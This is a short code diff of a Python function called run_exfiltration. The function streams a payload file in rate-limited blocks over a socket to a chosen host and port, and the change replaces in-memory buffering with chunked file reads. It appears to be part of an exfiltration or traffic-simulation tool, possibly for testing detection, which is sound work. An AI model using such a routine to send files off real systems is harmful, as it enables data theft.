@@ -126,9 +126,6 @@ def run_exfiltration(total_duration, rate_mbs, payload_paths, host, port):
 
     payload_path = payload_paths[0]
     file = open(payload_path, "rb")
-    payload_data = file.read()
-    file.close()
-    payload_size = len(payload_data)
 
     send_block_size = 4 * 1024 * 1024
     # control disk reader thread
@@ -142,40 +139,32 @@ def run_exfiltration(total_duration, rate_mbs, payload_paths, host, port):
     sent = 0
     chunks = 0
     end_time = time.time() + total_duration
-    pointer = 0
 
     try:
 
         while True:
-
             now = time.time()
-
             if now >= end_time:
                 break
 
             send_start = time.time()
 
-            if pointer + send_block_size > payload_size:
-                pointer = 0
-
-            block = payload_data[pointer : pointer + send_block_size]
+            block = file.read(send_block_size)
+            if not block:
+                file.seek(0)
+                block = file.read(send_block_size)
 
             sock.sendall(block)
-
-            pointer = pointer + send_block_size
 
             sent = sent + len(block)
             chunks = chunks + 1
 
             elapsed = time.time() - send_start
-
             expected = float(len(block)) / float(rate_bytes)
 
             sleep_for = expected - elapsed
-
             if sleep_for > 0:
                 time.sleep(sleep_for)
-
     finally:
 
         stop_flag["stop"] = True
